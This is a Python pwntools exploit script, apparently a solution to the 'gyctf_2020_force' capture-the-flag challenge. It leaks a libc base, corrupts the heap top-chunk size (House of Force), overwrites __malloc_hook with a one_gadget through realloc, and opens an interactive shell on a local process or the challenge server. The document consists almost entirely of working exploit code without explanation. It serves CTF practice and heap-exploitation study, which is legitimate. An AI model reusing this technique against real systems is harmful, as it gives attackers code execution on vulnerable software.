# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
binary = './gyctf_2020_force'
elf = ELF('./gyctf_2020_force')
libc = elf.libc

context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26212'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('puts\n',num)

def add(size,content):
    cmd(1)
    sla("size\n",size)
    ru("bin addr ")
    addr = rint(0x562a69f21010)
    sla("content\n",content)
    return addr

one_gad = [0x45216,0x4526a,0xf02a4,0xf1147]

libc.address = add(0x200000,"aa")+ 0x200ff0
__malloc_hook = libc.sym["__malloc_hook"]

realloc = libc.sym["__libc_realloc"]
one_gadget = one_gad[1] + libc.address

payload = "a"*0x10 + p64(0) + p64(0xFFFFFFFFFFFFFFFF)
top_addr = add(0x18,payload) + 0x10

lg("top_addr",top_addr)

offset = __malloc_hook - top_addr - 0x33

print(offset)

add(offset,"a\n")
dbg()
add(0x10 , p64(0) + p64(one_gadget) + p64(realloc+0x10))

dbg()
cmd(1)
sla("size\n",20)

p.interactive()

'''
@File    :   gyctf_2020_force.py
@Time    :   2021/07/14 11:21:49
@Author  :   Niyah 
'''
